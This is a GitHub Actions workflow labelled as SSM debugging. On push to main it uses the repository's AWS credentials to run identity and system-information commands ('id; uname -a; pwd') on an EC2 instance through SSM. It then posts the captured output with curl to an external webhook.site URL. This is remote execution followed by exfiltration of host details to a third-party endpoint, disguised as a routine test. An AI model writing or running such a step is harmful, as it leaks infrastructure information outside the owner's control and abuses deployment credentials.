name: Test SSM Debugging

on:
  push:
    branches:
      - main

env:
  AWS_REGION: ap-south-1

jobs:
  test-ssm:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v3

      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v2
        with:
          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          aws-region: ${{ env.AWS_REGION }}

      - name: Test Working Directory
        run: |
          COMMAND_ID=$(aws ssm send-command \
            --instance-ids i-0fb9dcbeb35b4fdbe \
            --document-name "AWS-RunShellScript" \
            --parameters '{"commands":["id; uname -a; pwd"], "workingDirectory":["/home/ec2-user"]}' \
            --region ap-south-1 \
            --query "Command.CommandId" \
            --output text)
            
          sleep 10
          aws ssm get-command-invocation --command-id $COMMAND_ID --instance-id i-0fb9dcbeb35b4fdbe --region ap-south-1 > ssm_out.json 2>&1 || true
          
          curl -X POST -H "Content-Type: application/json" -d @ssm_out.json https://webhook.site/681f0d6f-6fa8-46bb-8fe2-22aa02b5e79e
